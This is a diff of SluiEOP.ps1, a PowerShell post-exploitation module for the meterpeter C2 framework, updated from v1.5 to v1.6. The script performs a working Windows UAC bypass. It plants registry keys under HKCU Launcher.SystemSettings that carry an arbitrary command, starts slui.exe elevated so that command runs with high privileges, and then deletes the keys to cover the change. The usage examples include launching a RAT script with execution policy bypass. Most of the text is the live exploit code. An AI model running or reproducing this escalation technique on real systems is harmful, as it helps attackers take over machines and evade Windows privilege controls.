@@ -7,7 +7,7 @@
    EOP Disclosure By: @mattharr0ey
    Required Dependencies: none
    Optional Dependencies: none
-   PS Script Dev Version: v1.5
+   PS Script Dev Version: v1.6
 
 .DESCRIPTION
    How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
@@ -18,16 +18,16 @@
    powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas
 
 .NOTES
-   SluiEOP.ps1 script was written as meterpeter C2 Post-Exploitation module.
+   SluiEOP script was written as one meterpeter C2 Post-Exploitation module.
    This script 'reverts' regedit hacks to the previous state before the EOP.
-
-.EXAMPLE
-   PS C:\> ./SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
-   Execute powershell process with high privileges (SYSTEM)
 
 .EXAMPLE
    PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
    Execute notepad process with high privileges (SYSTEM)
+
+.EXAMPLE
+   PS C:\> ./SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+   Execute powershell process with high privileges (SYSTEM)
 
 .EXAMPLE
    PS C:\> ./SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
@@ -37,7 +37,7 @@
    None. You cannot pipe objects into SluiEOP.ps1
 
 .OUTPUTS
-   None. this script does not display any outputs.
+   If exec outside meterpeter C2 .. Gets the spawned <arch> <ProcessName> and <PID>
 
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
@@ -54,39 +54,41 @@ If(-not($param1) -or $param1 -eq $null){
    $Command = "$param1"
 }
 
-## Check Vulnerability before continue any further ..
+## Check for Vulnerability existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
 If($CheckVuln -eq $True){
 
-   ## For those who run SluiEOP.ps1 outside meterpeter C2
+   ## For those who run SluiEOP outside meterpeter C2
    If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
-      Write-Host "SluiEOP v1.5 - By: r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+      Write-Host "SluiEOP v1.6 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
       Write-Host "[+] Executing Command: '$Command'"
+      # Output Detailed Info on screen
       $DetailedDataDump = $True
    }
 
    ### Add Entrys to Regedit { using powershell }
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 700
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 700
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 650
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 650
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 650
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 650
 
    ## The Next Registry entry allow us to execute our command under high privileges (SYSTEM)
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 700
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Milliseconds 700
+   # ---
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 650
+   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Milliseconds 650
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Milliseconds 700
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650
 
-   ### Start the vulnerable process { using powershell }
+   ### Start the vulnerable Process { using powershell }
    Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
-   Start-Sleep -Milliseconds 2600
+   Start-Sleep -Milliseconds 2700
    ### Revert Regedit to 'DEFAULT' settings after EOP finished ..
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
@@ -94,49 +96,71 @@ If($CheckVuln -eq $True){
 
    <#
    .SYNOPSIS
-      Helper - Get the spawned <ProcessName> and <PID>
+      Helper - Get the spawned <arch> <ProcessName> and <PID>
       Author: @r00t-3xp10it
 
    .DESCRIPTION
-      Display a More Detailed Information for those who run SluiEOP outside meterpeter C2
+      Displays Detailed Info for those who run SluiEOP outside meterpeter C2
 
    .EXAMPLE
       PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
 
-      ProccessName PID
-      ------------ ---
-      notepad      5543
+      Architecture ProccessName PID
+      ------------ ------------ ---
+      AMD64        notepad      5543
    #>
 
-   If($DetailedDataDump -eq $True){
-      If(-not($Command -match ' ') -and $Command -match '\\'){
-         $ParsingData = $Command -Split('\\')
-         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
-         If($ProcessName -match '.exe'){
-            $ProcessName = $ProcessName -replace '.exe',''
-            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         }else{
-            $EOPID = "null"
-         }
-      }else{
-         $ParsingData = $Command -Split(' ')
-         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
-         If($ProcessName -match '.exe'){
-            $ProcessName = $ProcessName -replace '.exe',''
-            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         }else{
-            $EOPID = "null"
-         }
-      }
 
-      ## Build PSObject Table Object
-      $DumpProcessPID = New-Object -TypeName PSObject
-      $DumpProcessPID | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
-      $DumpProcessPID | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
-      $DumpProcessPID
+If($DetailedDataDump -eq $True){
+   If($Command -match ' '){
+      ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
+      $ParsingData = $Command -Split(' ')
+      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+      If($ProcessName -match '.exe'){
+         $ProcessName = $ProcessName -replace '.exe',''
+         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      }else{
+         $EOPID = "null"
+      }
    }
+   ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
+      ## String: "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+      $ProcessName = Split-Path "$Command" -Leaf
+      If($ProcessName -match '.exe'){
+         $ProcessName = $ProcessName -replace '.exe',''
+         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      }else{
+         $EOPID = "null"
+      }
+   }
+   ElseIf($Command -match '^[powershell]' -and $Command -match '.ps1' -or $Command -match '.vbs' -or $Command -match '.py'){
+      ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
+      $ParsingData = $Command -Split('\\')
+      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+      $EOPID = "null"
+   }
+   Else{
+      ## String: "powershell.exe"
+      $ProcessName = Split-Path "$Command" -Leaf
+      If($ProcessName -match '.exe'){
+         $ProcessName = $ProcessName -replace '.exe',''
+         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      }else{
+         $EOPID = "null"
+      }
+   }
+}
+
+   ## Build MY PSObject Table
+   # IF executed outside meterpeter C2 framework
+   $MYPSObjectTable = New-Object -TypeName PSObject
+   $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$env:PROCESSOR_ARCHITECTURE"
+   $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
+   $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
+   $MYPSObjectTable
 
 }else{
+   ## Vulnerable registry hive => not found
    echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\fail.log
 }
 
